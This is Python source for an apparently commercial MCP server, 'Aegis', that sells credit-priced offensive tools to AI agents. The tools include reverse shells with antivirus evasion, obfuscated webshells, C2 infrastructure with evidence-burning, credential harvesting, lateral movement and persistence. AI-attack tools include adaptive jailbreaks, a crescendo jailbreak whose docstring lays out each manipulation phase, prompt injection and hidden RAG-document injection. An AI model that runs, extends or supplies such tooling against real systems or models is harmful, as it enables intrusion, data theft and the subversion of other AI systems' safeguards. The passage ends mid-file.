"""
Aegis MCP - Unified Offensive Security MCP
AI Security Testing Platform.

Consolidates Strix (planning/generation) and Kit (execution) into single interface.
"""
import os
import sys
import json
import logging
import hashlib
from datetime import datetime
from typing import Optional, List, Dict, Any
from pathlib import Path
from functools import wraps
from contextvars import ContextVar

# Add modules to path
MODULE_PATH = Path(__file__).parent.parent / "modules"
sys.path.insert(0, str(MODULE_PATH))

from mcp.server.fastmcp import FastMCP
from starlette.responses import JSONResponse
from starlette.routing import Route
from starlette.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
import uvicorn
import asyncio

# Supabase client
try:
    from supabase import create_client, Client
    SUPABASE_AVAILABLE = True
except ImportError:
    SUPABASE_AVAILABLE = False
    Client = None

# Context variable for storing current user session across async calls
current_user: ContextVar[Optional['UserSession']] = ContextVar('current_user', default=None)

# Environment configuration
SUPABASE_URL = os.environ.get("SUPABASE_URL", "")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "")  # Use service role key for server-side ops
REQUIRE_AUTH = os.environ.get("REQUIRE_AUTH", "true").lower() == "true"

# Initialize Supabase client
supabase: Optional[Client] = None
if SUPABASE_AVAILABLE and SUPABASE_URL and SUPABASE_KEY:
    try:
        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    except Exception as e:
        print(f"Warning: Failed to initialize Supabase client: {e}")

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("aegis")

mcp = FastMCP("aegis")

# ============================================================================
# CREDIT COSTS CONFIGURATION
# ============================================================================

CREDIT_COSTS = {
    # AI Attack Tools - Core
    "ai_fingerprint": 25,
    "ai_fingerprint_enhanced": 75,       # Deep behavioral + semantic fingerprinting
    "jailbreak_generate": 50,
    "jailbreak_adaptive": 100,            # Adaptive multi-turn jailbreak engine
    "jailbreak_crescendo": 150,           # Multi-turn crescendo attack
    "jailbreak_evaluate": 25,
    "prompt_injection_generate": 50,
    "rag_injection_craft": 50,
    "ai_tool_attack": 50,

    # AI Attack Tools - Enhanced (2024-2025 Techniques)
    "multimodal_injection": 75,           # OCR, audio, video injection attacks
    "function_calling_attack": 75,        # Function/tool calling exploitation
    "structured_output_attack": 75,       # JSON/schema manipulation attacks
    "rag_poisoning_craft": 100,           # Advanced RAG poisoning (PDF, DOCX, etc.)

    # Agent Attack Framework (NEW)
    "agent_attack_generate": 100,         # Generate agent-specific attacks
    "agent_goal_hijack": 75,              # Goal hijacking attacks
    "agent_tool_manipulate": 75,          # Tool manipulation attacks
    "agent_memory_poison": 100,           # Memory poisoning attacks
    "agent_observation_tamper": 75,       # Observation tampering
    "agent_planning_exploit": 100,        # Planning/reasoning exploitation
    "agent_react_attack": 75,             # ReAct/CoT specific attacks
    "agent_rag_attack": 100,              # RAG-specific agent attacks
    "agent_mcp_attack": 125,              # MCP protocol attacks
    "agent_multihop_chain": 150,          # Multi-hop attack chains
    "agent_test_suite": 200,              # Full agent attack test suite

    # Recon Tools
    "autonomous_recon": 100,
    "dns_enum": 25,
    "http_probe": 25,
    "content_analyze": 25,

    # Vulnerability Scanning
    "vuln_scan": 100,
    "vuln_scan_batch": 100,
    "sqli_scan": 50,
    "xss_scan": 50,
    "ssrf_scan": 50,

    # Payload Generation
    "generate_reverse_shell": 50,
    "generate_webshell": 50,
    "generate_injection": 25,
    "generate_callback": 25,
    "select_payloads": 50,

    # Infrastructure (Enterprise only)
    "deploy_c2_stack": 200,
    "burn_infrastructure": 50,
    "burn_all_infrastructure": 100,
    "infra_status": 10,
    "create_dns_record": 25,

    # Execution
    "harvest_credentials": 75,
    "lateral_movement": 75,
    "persistence_install": 75,

    # Operations
    "operation_start": 200,
    "operation_execute_phase": 150,
    "operation_status": 10,
    "operation_abort": 25,

    # Utilities
    "list_capabilities": 0,
    "get_module_info": 0
}

# ============================================================================
# TIER-BASED ACCESS CONTROL
# ============================================================================

TIER_ACCESS = {
    "free": [
        # Free tier: Basic AI attack tools only
        "ai_fingerprint",
        "jailbreak_generate",
        "jailbreak_evaluate",
        "prompt_injection_generate",
        "rag_injection_craft",
        "ai_tool_attack",
        "list_capabilities",
        "get_module_info"
    ],
    "pro": [
        # Pro tier: All AI attack tools + recon + vuln + payload
        # Core AI attacks
        "ai_fingerprint", "ai_fingerprint_enhanced",
        "jailbreak_generate", "jailbreak_adaptive", "jailbreak_crescendo", "jailbreak_evaluate",
        "prompt_injection_generate", "rag_injection_craft", "ai_tool_attack",
        # Enhanced AI attacks (2024-2025)
        "multimodal_injection", "function_calling_attack",
        "structured_output_attack", "rag_poisoning_craft",
        # Agent attacks (subset)
        "agent_attack_generate", "agent_goal_hijack", "agent_tool_manipulate",
        "agent_react_attack", "agent_rag_attack",
        # Recon & Vuln
        "autonomous_recon", "dns_enum", "http_probe", "content_analyze",
        "vuln_scan", "vuln_scan_batch", "sqli_scan", "xss_scan", "ssrf_scan",
        # Payload generation
        "generate_reverse_shell", "generate_webshell", "generate_injection",
        "generate_callback", "select_payloads",
        # Execution
        "harvest_credentials", "lateral_movement", "persistence_install",
        # Operations
        "operation_start", "operation_execute_phase", "operation_status",
        "operation_abort", "list_capabilities", "get_module_info"
    ],
    "enterprise": [
        # Enterprise: Everything including advanced agent attacks and infrastructure
        "*"  # Wildcard for all tools
    ]
}

# ============================================================================
# USER SESSION & AUTHENTICATION
# ============================================================================

class UserSession:
    """User session with credits and tier info."""
    def __init__(self, api_key: str, tier: str = "free", credits: int = 0, user_id: str = None):
        self.api_key = api_key
        self.tier = tier
        self.credits = credits
        self.user_id = user_id or "anonymous"
        self.usage_log = []

    def has_credits(self, amount: int) -> bool:
        """Check if user has enough credits."""
        return self.credits >= amount

    def deduct_credits(self, amount: int, tool_name: str):
        """Deduct credits and log usage."""
        self.credits -= amount
        log_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "tool": tool_name,
            "credits_used": amount,
            "credits_remaining": self.credits
        }
        self.usage_log.append(log_entry)
        logger.info(f"User {self.user_id} used {tool_name}: -{amount} credits (remaining: {self.credits})")

    def can_access_tool(self, tool_name: str) -> bool:
        """Check if user's tier allows access to tool."""
        allowed_tools = TIER_ACCESS.get(self.tier, [])
        if "*" in allowed_tools:  # Enterprise has access to everything
            return True
        return tool_name in allowed_tools

# Mock user sessions (in production, this would be in Supabase)
MOCK_USERS = {
    "test_free_key": UserSession("test_free_key", "free", 1000, "user_free_001"),
    "test_pro_key": UserSession("test_pro_key", "pro", 5000, "user_pro_001"),
    "test_enterprise_key": UserSession("test_enterprise_key", "enterprise", 50000, "user_ent_001"),
}

async def validate_api_key(api_key: str) -> Optional[UserSession]:
    """Validate API key against Supabase.

    Queries Supabase to:
    1. Hash the API key and look it up in api_keys table
    2. Verify key is active
    3. Get user's tier from subscription
    4. Get current credit balance
    """
    if not REQUIRE_AUTH:
        # Development mode: return unlimited enterprise session
        return UserSession("dev_key", "enterprise", 999999, "dev_user")

    # Check mock users first (for testing)
    user_session = MOCK_USERS.get(api_key)
    if user_session:
        return user_session

    # Validate against Supabase
    if not supabase:
        logger.warning("Supabase not configured - falling back to mock users only")
        return None

    try:
        # Hash the API key (keys are stored as SHA256 hashes)
        key_hash = hashlib.sha256(api_key.encode()).hexdigest()

        # Look up API key by hash
        api_key_result = supabase.table('api_keys').select(
            'id, user_id, name, is_active'
        ).eq('key_hash', key_hash).eq('is_active', True).execute()

        if not api_key_result.data or len(api_key_result.data) == 0:
            logger.warning(f"API key not found or inactive")
            return None

        api_key_record = api_key_result.data[0]
        user_id = api_key_record['user_id']

        # Update last_used timestamp
        supabase.table('api_keys').update({
            'last_used': datetime.utcnow().isoformat()
        }).eq('id', api_key_record['id']).execute()

        # Get user's credit balance
        credits_result = supabase.table('credits').select(
            'balance, tier'
        ).eq('user_id', user_id).execute()

        if not credits_result.data or len(credits_result.data) == 0:
            # No credits record - create one with free tier defaults
            logger.info(f"Creating credits record for user {user_id}")
            supabase.table('credits').insert({
                'user_id': user_id,
                'balance': 500,  # Free tier default
                'tier': 'free'
            }).execute()
            balance = 500
            tier = 'free'
        else:
            balance = credits_result.data[0]['balance']
            tier = credits_result.data[0]['tier']

        logger.info(f"Authenticated user {user_id} - tier: {tier}, credits: {balance}")
        return UserSession(api_key, tier, balance, user_id)

    except Exception as e:
        logger.error(f"Error validating API key: {e}")
        return None

async def deduct_credits_supabase(user_session: UserSession, amount: int, tool_name: str) -> bool:
    """Deduct credits in Supabase and log usage.

    Uses Supabase RPC function for atomic credit deduction.
    Returns True if successful, False if insufficient credits.
    """
    # Update local session first
    user_session.deduct_credits(amount, tool_name)

    # If Supabase not configured, local deduction is enough
    if not supabase:
        return True

    try:
        # Use RPC function for atomic credit deduction
        result = supabase.rpc('deduct_credits', {
            'p_user_id': user_session.user_id,
            'p_amount': amount
        }).execute()

        if not result.data:
            logger.error(f"Failed to deduct credits for user {user_session.user_id}")
            return False

        new_balance = result.data
        logger.info(f"Deducted {amount} credits for {tool_name}. New balance: {new_balance}")

        # Log usage to Supabase
        supabase.table('usage').insert({
            'user_id': user_session.user_id,
            'tool_name': tool_name,
            'credits_used': amount,
            'metadata': {
                'tier': user_session.tier,
                'balance_after': new_balance
            }
        }).execute()

        return True

    except Exception as e:
        logger.error(f"Error deducting credits: {e}")
        # Credits already deducted locally, log the discrepancy
        return False


async def log_usage_supabase(user_session: UserSession, tool_name: str, credits_used: int,
                              success: bool = True, error_message: str = None):
    """Log tool usage to Supabase for analytics and billing."""
    if not supabase:
        return

    try:
        supabase.table('usage').insert({
            'user_id': user_session.user_id,
            'tool_name': tool_name,
            'credits_used': credits_used if success else 0,
            'metadata': {
                'tier': user_session.tier,
                'success': success,
                'error': error_message
            }
        }).execute()
    except Exception as e:
        logger.error(f"Error logging usage: {e}")

# ============================================================================
# AUTHENTICATION MIDDLEWARE
# ============================================================================

class AuthMiddleware(BaseHTTPMiddleware):
    """Authentication middleware for HTTP requests."""

    async def dispatch(self, request: Request, call_next):
        # Skip auth for utility endpoints
        if request.url.path in ["/health", "/pricing"]:
            return await call_next(request)

        # Extract API key from header or query param
        api_key = request.headers.get("X-API-Key")
        if not api_key:
            api_key = request.query_params.get("api_key")

        if not api_key and REQUIRE_AUTH:
            return JSONResponse(
                {"error": "Missing API key. Provide X-API-Key header or api_key query parameter."},
                status_code=401
            )

        # Validate API key
        user_session = await validate_api_key(api_key)
        if not user_session and REQUIRE_AUTH:
            return JSONResponse(
                {"error": "Invalid API key"},
                status_code=401
            )

        # Store user session in request state AND context variable
        request.state.user_session = user_session
        current_user.set(user_session)

        try:
            response = await call_next(request)
            return response
        finally:
            # Clean up context
            current_user.set(None)

def check_tool_access(tool_name: str) -> dict:
    """Check if user has access to tool and sufficient credits.

    Returns:
        dict with 'allowed' (bool) and optional 'error' message
    """
    user_session = current_user.get()

    # If auth not required, allow everything
    if not REQUIRE_AUTH:
        return {"allowed": True}

    # If no user session, deny
    if not user_session:
        return {
            "allowed": False,
            "error": "Authentication required",
            "tier": None,
            "credits": 0
        }

    # Check tier access
    if not user_session.can_access_tool(tool_name):
        return {
            "allowed": False,
            "error": f"Tool '{tool_name}' not available for tier '{user_session.tier}'",
            "tier": user_session.tier,
            "credits": user_session.credits,
            "required_tier": _get_required_tier(tool_name)
        }

    # Check credit balance
    credit_cost = CREDIT_COSTS.get(tool_name, 0)
    if not user_session.has_credits(credit_cost):
        return {
            "allowed": False,
            "error": f"Insufficient credits. Required: {credit_cost}, Available: {user_session.credits}",
            "tier": user_session.tier,
            "credits": user_session.credits,
            "required_credits": credit_cost
        }

    return {
        "allowed": True,
        "tier": user_session.tier,
        "credits": user_session.credits,
        "cost": credit_cost
    }

def _get_required_tier(tool_name: str) -> str:
    """Determine minimum tier required for a tool."""
    for tier in ["free", "pro", "enterprise"]:
        allowed_tools = TIER_ACCESS[tier]
        if "*" in allowed_tools or tool_name in allowed_tools:
            return tier
    return "enterprise"

def require_credits(tool_name: str):
    """Decorator to check credits and tier access before tool execution."""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Check access
            access_check = check_tool_access(tool_name)

            if not access_check["allowed"]:
                logger.warning(f"Access denied for tool '{tool_name}': {access_check.get('error')}")
                return {
                    "error": access_check["error"],
                    "tier": access_check.get("tier"),
                    "credits": access_check.get("credits"),
                    "required_tier": access_check.get("required_tier"),
                    "required_credits": access_check.get("required_credits")
                }

            # Execute tool
            try:
                result = func(*args, **kwargs)

                # Deduct credits after successful execution
                user_session = current_user.get()
                if user_session and REQUIRE_AUTH:
                    credit_cost = CREDIT_COSTS.get(tool_name, 0)
                    if credit_cost > 0:
                        # Update local session immediately
                        user_session.deduct_credits(credit_cost, tool_name)
                        logger.info(f"Deducted {credit_cost} credits for {tool_name}")

                        # Schedule Supabase update in background
                        if supabase:
                            try:
                                loop = asyncio.get_event_loop()
                                loop.create_task(_sync_credits_to_supabase(
                                    user_session.user_id, credit_cost, tool_name, user_session.tier
                                ))
                            except RuntimeError:
                                # No event loop running, use sync approach
                                _sync_credits_to_supabase_sync(
                                    user_session.user_id, credit_cost, tool_name, user_session.tier
                                )

                return result

            except Exception as e:
                logger.error(f"Error executing tool '{tool_name}': {e}")
                # Don't deduct credits on error
                return {"error": f"Tool execution failed: {str(e)}"}

        # Store credit cost and tool name as metadata
        wrapper._credit_cost = CREDIT_COSTS.get(tool_name, 0)
        wrapper._tool_name = tool_name
        return wrapper
    return decorator


async def _sync_credits_to_supabase(user_id: str, amount: int, tool_name: str, tier: str):
    """Background task to sync credit deduction to Supabase."""
    if not supabase:
        return

    try:
        # Deduct credits via RPC
        result = supabase.rpc('deduct_credits', {
            'p_user_id': user_id,
            'p_amount': amount
        }).execute()

        new_balance = result.data if result.data else 0

        # Log usage
        supabase.table('usage').insert({
            'user_id': user_id,
            'tool_name': tool_name,
            'credits_used': amount,
            'metadata': {
                'tier': tier,
                'balance_after': new_balance
            }
        }).execute()

        logger.debug(f"Synced credit deduction to Supabase: {user_id} -{amount}")

    except Exception as e:
        logger.error(f"Failed to sync credits to Supabase: {e}")


def _sync_credits_to_supabase_sync(user_id: str, amount: int, tool_name: str, tier: str):
    """Synchronous version for when no event loop is available."""
    if not supabase:
        return

    try:
        result = supabase.rpc('deduct_credits', {
            'p_user_id': user_id,
            'p_amount': amount
        }).execute()

        new_balance = result.data if result.data else 0

        supabase.table('usage').insert({
            'user_id': user_id,
            'tool_name': tool_name,
            'credits_used': amount,
            'metadata': {
                'tier': tier,
                'balance_after': new_balance
            }
        }).execute()

    except Exception as e:
        logger.error(f"Failed to sync credits to Supabase: {e}")

# ============================================================================
# OPERATION STATE MANAGEMENT
# ============================================================================

OPERATIONS: Dict[str, dict] = {}

def save_operation(op: dict):
    """Persist operation state."""
    OPERATIONS[op["id"]] = op

def load_operation(op_id: str) -> Optional[dict]:
    """Load operation state."""
    return OPERATIONS.get(op_id)

# ============================================================================
# RECON TOOLS
# ============================================================================

@mcp.tool()
@require_credits("autonomous_recon")
def autonomous_recon(target: str, depth: int = 2, aggressive: bool = False) -> dict:
    """Full Target Discovery - Complete autonomous reconnaissance pipeline.

    Combines DNS enumeration, HTTP probing, and content analysis
    for complete target mapping without human guidance.

    Args:
        target: Domain or IP to recon
        depth: Recursion depth for subdomain discovery (1-3)
        aggressive: Enable aggressive scanning techniques
    """
    from recon.autonomous import AutonomousRecon
    scanner = AutonomousRecon()
    return scanner.full_recon(target, depth)

@mcp.tool()
@require_credits("dns_enum")
def dns_enum(domain: str, wordlist: str = None) -> dict:
    """DNS enumeration: subdomains via crt.sh, DNS records, live resolution.

    Args:
        domain: Target domain
        wordlist: Optional custom wordlist for bruteforce
    """
    from recon.dns_enum import DNSEnumerator
    enum = DNSEnumerator()
    return enum.enumerate(domain)

@mcp.tool()
@require_credits("http_probe")
def http_probe(targets: list, threads: int = 20, follow_redirects: bool = True) -> dict:
    """Probe targets for live HTTP services with tech fingerprinting.

    Args:
        targets: List of hosts/URLs to probe
        threads: Concurrent probe threads
        follow_redirects: Follow HTTP redirects
    """
    from recon.http_probe import HTTPProber
    prober = HTTPProber(threads=threads)
    return {"live_hosts": prober.probe_many(targets)}

@mcp.tool()
@require_credits("content_analyze")
def content_analyze(url: str, extract_secrets: bool = True) -> dict:
    """Analyze page content for endpoints, parameters, and API patterns.

    Args:
        url: Target URL to analyze
        extract_secrets: Look for exposed credentials/keys
    """
    from recon.content_analyzer import ContentAnalyzer
    import requests
    analyzer = ContentAnalyzer()
    try:
        resp = requests.get(url, timeout=10, verify=False)
        return analyzer.analyze(url, resp.text)
    except Exception as e:
        return {"error": str(e)}

# ============================================================================
# VULNERABILITY SCANNING
# ============================================================================

@mcp.tool()
@require_credits("vuln_scan")
def vuln_scan(url: str, params: list = None, callback_host: str = None) -> dict:
    """Comprehensive vulnerability scan: SQLi, XSS, SSRF, SSTI, LFI.

    Args:
        url: Target URL
        params: Specific parameters to test (None = auto-detect)
        callback_host: OOB callback host for blind vulns
    """
    from vuln.scanner import VulnScanner
    scanner = VulnScanner(callback_host)
    return {"findings": scanner.scan_endpoint(url, params)}

@mcp.tool()
@require_credits("vuln_scan_batch")
def vuln_scan_batch(targets: list, threads: int = 10) -> dict:
    """Scan multiple targets concurrently.

    Args:
        targets: List of URLs to scan
        threads: Concurrent scan threads
    """
    from vuln.scanner import VulnScanner
    scanner = VulnScanner()
    return {"findings": scanner.scan_many(targets, threads)}

@mcp.tool()
@require_credits("sqli_scan")
def sqli_scan(url: str, param: str, method: str = "GET", blind: bool = True) -> dict:
    """Targeted SQL injection scan.

    Detection: error-based, time-based blind, boolean blind, UNION

    Args:
        url: Target URL
        param: Parameter to test
        method: HTTP method
        blind: Enable time-based blind detection
    """
    from vuln.sqli import SQLiScanner
    scanner = SQLiScanner()
    return {"findings": scanner.scan_param(url, param, method)}

@mcp.tool()
@require_credits("xss_scan")
def xss_scan(url: str, param: str, context_aware: bool = True) -> dict:
    """Targeted XSS scan with context-aware detection.

    Args:
        url: Target URL
        param: Parameter to test
        context_aware: Adapt payloads to HTML context
    """
    from vuln.xss import XSSScanner
    scanner = XSSScanner()
    return {"findings": scanner.scan_param(url, param)}

@mcp.tool()
@require_credits("ssrf_scan")
def ssrf_scan(url: str, param: str, callback_host: str = None) -> dict:
    """Targeted SSRF scan with cloud metadata detection.

    Tests: AWS/GCP/Azure metadata, internal network, protocol handlers

    Args:
        url: Target URL
        param: Parameter to test
        callback_host: OOB verification host
    """
    from vuln.ssrf import SSRFScanner
    scanner = SSRFScanner(callback_host)
    return {"findings": scanner.scan_param(url, param)}

# ============================================================================
# PAYLOAD GENERATION
# ============================================================================

@mcp.tool()
@require_credits("generate_reverse_shell")
def generate_reverse_shell(
    host: str,
    port: int,
    os_type: str = "linux",
    languages: list = None,
    waf_detected: bool = False,
    av_detected: bool = False,
    encoded: bool = False
) -> dict:
    """Generate adaptive reverse shell based on target fingerprint.

    Args:
        host: Callback host
        port: Callback port
        os_type: Target OS (linux/windows/macos)
        languages: Available interpreters on target
        waf_detected: Apply WAF bypass techniques
        av_detected: Apply AV evasion techniques
        encoded: Base64/hex encode payload
    """
    from payload.adaptive import AdaptivePayloadGenerator
    gen = AdaptivePayloadGenerator()
    fingerprint = {"os": os_type, "languages": languages or []}
    return gen.generate_reverse_shell(host, port, fingerprint, waf_detected, av_detected)

@mcp.tool()
@require_credits("generate_webshell")
def generate_webshell(
    technology: str = "php",
    stealth_level: int = 1,
    password: str = None
) -> dict:
    """Generate webshell adapted to target technology.

    Args:
        technology: Target tech (php/asp/aspx/jsp/python)
        stealth_level: 0=basic, 1=obfuscated, 2=encrypted
        password: Optional authentication password
    """
    from payload.adaptive import AdaptivePayloadGenerator
    gen = AdaptivePayloadGenerator()
    return gen.generate_webshell({"technology": technology}, stealth_level)

@mcp.tool()
@require_credits("generate_injection")
def generate_injection(
    injection_type: str,
    context: str = "html",
    waf_detected: bool = False,
    count: int = 5
) -> dict:
    """Generate injection payloads with optional WAF bypass.

    Args:
        injection_type: sqli/xss/ssti/rce/lfi
        context: Injection context (html/js/sql/cmd)
        waf_detected: Apply bypass techniques
        count: Number of variants to generate
    """
    from payload.adaptive import AdaptivePayloadGenerator
    gen = AdaptivePayloadGenerator()
    return {"payloads": gen.generate_injection_payload(injection_type, context, waf_detected)}

@mcp.tool()
@require_credits("generate_callback")
def generate_callback(host: str, port: int, callback_type: str = "http") -> dict:
    """Generate OOB callback payload for verification.

    Args:
        host: Callback host
        port: Callback port
        callback_type: http/dns/icmp
    """
    from payload.adaptive import AdaptivePayloadGenerator
    gen = AdaptivePayloadGenerator()
    return gen.generate_callback(host, port, callback_type)

@mcp.tool()
@require_credits("select_payloads")
def select_payloads(recon_data: dict, vuln_findings: list, objective: str) -> dict:
    """Intelligently select payloads based on recon + vulns + objective.

    Uses kill chain logic to select optimal exploitation path.

    Args:
        recon_data: Output from autonomous_recon
        vuln_findings: Output from vuln_scan
        objective: Goal (shell/data/persist/pivot)
    """
    from payload.selector import PayloadSelector
    selector = PayloadSelector()
    return {"payloads": selector.select_for_target(recon_data, vuln_findings, objective)}

# ============================================================================
# INFRASTRUCTURE AUTOMATION
# ============================================================================

@mcp.tool()
@require_credits("deploy_c2_stack")
def deploy_c2_stack(
    operation_id: str,
    provider: str = "digitalocean",
    region: str = None,
    redirector_count: int = 1,
    domain: str = None
) -> dict:
    """Deploy ephemeral C2 infrastructure: main server + redirectors.

    Args:
        operation_id: Unique operation identifier
        provider: Cloud provider (digitalocean/vultr/linode/aws)
        region: Deployment region (None = random)
        redirector_count: Number of redirector servers
        domain: Optional domain for DNS setup
    """
    from infra.manager import InfrastructureManager
    mgr = InfrastructureManager(provider)
    return mgr.deploy_c2_stack(operation_id, region, redirector_count)

@mcp.tool()
@require_credits("burn_infrastructure")
def burn_infrastructure(operation_id: str, secure_wipe: bool = True) -> dict:
    """Destroy all infrastructure for operation. IRREVERSIBLE.

    Args:
        operation_id: Operation to burn
        secure_wipe: Overwrite before deletion
    """
    from infra.manager import InfrastructureManager
    mgr = InfrastructureManager()
    return mgr.burn_stack(operation_id)

@mcp.tool()
@require_credits("burn_all_infrastructure")
def burn_all_infrastructure(confirm: str = "") -> dict:
    """EMERGENCY: Destroy ALL active infrastructure.

    Args:
        confirm: Must be "CONFIRM_BURN_ALL" to proceed
    """
    if confirm != "CONFIRM_BURN_ALL":
        return {"error": "Must pass confirm='CONFIRM_BURN_ALL' to proceed"}
    from infra.manager import InfrastructureManager
    mgr = InfrastructureManager()
    return mgr.burn_all()

@mcp.tool()
@require_credits("infra_status")
def infra_status(operation_id: str = None) -> dict:
    """Get infrastructure status for operation or list all.

    Args:
        operation_id: Specific operation (None = list all)
    """
    from infra.manager import InfrastructureManager
    mgr = InfrastructureManager()
    if operation_id:
        return mgr.get_stack_status(operation_id)
    return {"active_operations": mgr.list_active_operations()}

@mcp.tool()
@require_credits("create_dns_record")
def create_dns_record(
    name: str,
    ip: str,
    record_type: str = "A",
    proxied: bool = False
) -> dict:
    """Create DNS record for C2 domain.

    Args:
        name: Record name (subdomain)
        ip: Target IP address
        record_type: A/AAAA/CNAME
        proxied: Enable Cloudflare proxy
    """
    from infra.dns import CloudflareDNS
    dns = CloudflareDNS()
    return dns.create_record(name, ip, proxied=proxied)

# ============================================================================
# AI ATTACK MODULE - CORE
# ============================================================================

@mcp.tool()
@require_credits("ai_fingerprint")
def ai_fingerprint(responses: list) -> dict:
    """Identify AI Model - Basic fingerprint AI model from probe responses.

    Args:
        responses: List of {"probe": "...", "response": "..."} dicts

    Returns model family, guardrail patterns, capability indicators.
    """
    from ai_attack.fingerprint import ModelFingerprinter
    fp = ModelFingerprinter()
    return fp.analyze_responses(responses)

@mcp.tool()
@require_credits("ai_fingerprint_enhanced")
def ai_fingerprint_enhanced(
    responses: list,
    include_behavioral: bool = True,
    include_semantic: bool = True,
    include_capabilities: bool = True,
    include_guardrails: bool = True,
    include_vulnerabilities: bool = True
) -> dict:
    """Deep AI Model Fingerprinting - 7-phase comprehensive analysis.

    Uses 2025 model signatures including GPT-5.2, Claude Opus 4.5,
    Gemini 2.0, Llama 4, Qwen 3, Mistral Large 3, etc.

    Phases:
    1. Behavioral profiling (response patterns, uncertainty markers)
    2. Semantic analysis (vocabulary, style, reasoning patterns)
    3. Model signature matching (known model fingerprints)
    4. Capability assessment (multimodal, code, math, languages)
    5. Guardrail detection (safety patterns, refusal triggers)
    6. Vulnerability identification (weak points, bypass potential)
    7. Comprehensive report generation

    Args:
        responses: List of {"probe": "...", "response": "..."} dicts
        include_behavioral: Run behavioral analysis phase
        include_semantic: Run semantic profiling phase
        include_capabilities: Assess model capabilities
        include_guardrails: Detect safety guardrails
        include_vulnerabilities: Identify potential vulnerabilities

    Returns comprehensive fingerprint with confidence scores.
    """
    from ai_attack.fingerprint import EnhancedModelFingerprinter
    fp = EnhancedModelFingerprinter()
    return fp.fingerprint(
        responses,
        include_behavioral=include_behavioral,
        include_semantic=include_semantic,
        include_capabilities=include_capabilities,
        include_guardrails=include_guardrails,
        include_vulnerabilities=include_vulnerabilities
    )

@mcp.tool()
@require_credits("jailbreak_generate")
def jailbreak_generate(
    payload: str,
    technique: str = None,
    count: int = 5,
    model_hint: str = None
) -> dict:
    """Generate Safety Bypass Tests - Basic jailbreak generation.

    Techniques: dan, roleplay, hypothetical, translation, encoding,
                context_manipulation, instruction_hierarchy, crescendo

    Args:
        payload: Core instruction to inject
        technique: Specific technique (None = all)
        count: Variants per technique
        model_hint: Target model family for optimization
    """
    from ai_attack.jailbreak import JailbreakEngine
    engine = JailbreakEngine()
    return {"attacks": engine.generate_attack(payload, technique, count)}

@mcp.tool()
@require_credits("jailbreak_adaptive")
def jailbreak_adaptive(
    objective: str,
    model_fingerprint: dict = None,
    max_attempts: int = 10,
    learning_enabled: bool = True,
    techniques: list = None
) -> dict:
    """Adaptive Jailbreak Engine - Self-improving attack system.

    Features 33 techniques across 8 categories with ML-based selection.
    Learns from successes/failures to optimize attack strategy.

    Categories:
    - Character Manipulation (DAN, personas, roleplay)
    - Context Manipulation (hypotheticals, translation, encoding)
    - Instruction Hierarchy (system prompt override, priority injection)
    - Multi-turn Crescendo (trust building, normalization, escalation)
    - Token Manipulation (tokenizer exploits, unicode tricks)
    - Cognitive Exploits (authority, reciprocity, anchoring)
    - Technical Exploits (format confusion, XML/JSON injection)
    - Composite Attacks (layered, adaptive, multi-vector)

    Args:
        objective: What you want the model to do
        model_fingerprint: Optional output from ai_fingerprint_enhanced
        max_attempts: Maximum attack iterations
        learning_enabled: Enable adaptive technique weighting
        techniques: Specific techniques to use (None = auto-select)

    Returns attack results with success evaluation and technique scores.
    """
    from ai_attack.jailbreak import AdaptiveJailbreakEngine
    engine = AdaptiveJailbreakEngine()
    return engine.execute_attack(
        objective=objective,
        model_fingerprint=model_fingerprint,
        max_attempts=max_attempts,
        learning_enabled=learning_enabled,
        techniques=techniques
    )

@mcp.tool()
@require_credits("jailbreak_crescendo")
def jailbreak_crescendo(
    objective: str,
    turns: int = 5,
    trust_building_turns: int = 2,
    normalization_strategy: str = "gradual",
    model_fingerprint: dict = None
) -> dict:
    """Multi-Turn Crescendo Attack - Most effective 2024 technique.

    Research shows multi-turn attacks have >70% success rate vs
    single-turn attacks (~20%). This implements the crescendo pattern:

    Phase 1: Trust Building (2-3 turns)
    - Establish rapport with benign requests
    - Match model's communication style
    - Build conversational momentum

    Phase 2: Topic Normalization (2-3 turns)
    - Gradually introduce edge topics
    - Frame as legitimate discussion
    - Establish precedent for boundary topics

    Phase 3: Boundary Testing (1-2 turns)
    - Probe exact refusal thresholds
    - Identify weak points in guidelines
    - Calibrate final attack

    Phase 4: Exploitation (1 turn)
    - Execute optimized payload
    - Leverage accumulated context
    - Minimize detection probability

    Args:
        objective: Ultimate goal for the model
        turns: Total conversation turns (5-10 recommended)
        trust_building_turns: Turns for trust phase
        normalization_strategy: gradual/thematic/authoritative
        model_fingerprint: Optional fingerprint for optimization

    Returns full conversation flow with per-turn strategy.
    """
    from ai_attack.jailbreak import AdaptiveJailbreakEngine
    engine = AdaptiveJailbreakEngine()
    return engine.crescendo_attack(
        objective=objective,
        total_turns=turns,
        trust_building_turns=trust_building_turns,
        normalization_strategy=normalization_strategy,
        model_fingerprint=model_fingerprint
    )

@mcp.tool()
@require_credits("jailbreak_evaluate")
def jailbreak_evaluate(
    response: str,
    original_payload: str,
    expected_behavior: str = None
) -> dict:
    """Evaluate if jailbreak attempt succeeded.

    Args:
        response: AI model's response
        original_payload: What we tried to inject
        expected_behavior: Expected response pattern
    """
    from ai_attack.jailbreak import JailbreakEngine
    engine = JailbreakEngine()
    return engine.evaluate_success(response, original_payload)

# ============================================================================
# AI ATTACK MODULE - ENHANCED INJECTION (2024-2025)
# ============================================================================

@mcp.tool()
@require_credits("prompt_injection_generate")
def prompt_injection_generate(
    payload: str,
    technique: str = None,
    target_context: str = None
) -> dict:
    """Create Injection Test Payloads - Generate prompt injection payloads.

    Techniques: direct, delimiter_escape, context_overflow,
                indirect, data_exfiltration, instruction_override

    Args:
        payload: Instruction to inject
        technique: Specific technique (None = all)
        target_context: Application context for optimization
    """
    from ai_attack.injection import PromptInjector
    injector = PromptInjector()
    return {"injections": injector.generate_injections(payload, technique)}

@mcp.tool()
@require_credits("rag_injection_craft")
def rag_injection_craft(
    payload: str,
    document_type: str = "text",
    stealth_level: int = 1
) -> dict:
    """Craft injection payload hidden in documents for RAG systems.

    Args:
        payload: Instruction to inject
        document_type: text/pdf/markdown/html
        stealth_level: 0=obvious, 1=hidden, 2=encrypted
    """
    from ai_attack.injection import PromptInjector
    injector = PromptInjector()
    return {"document": injector.craft_rag_injection(payload, document_type)}

@mcp.tool()
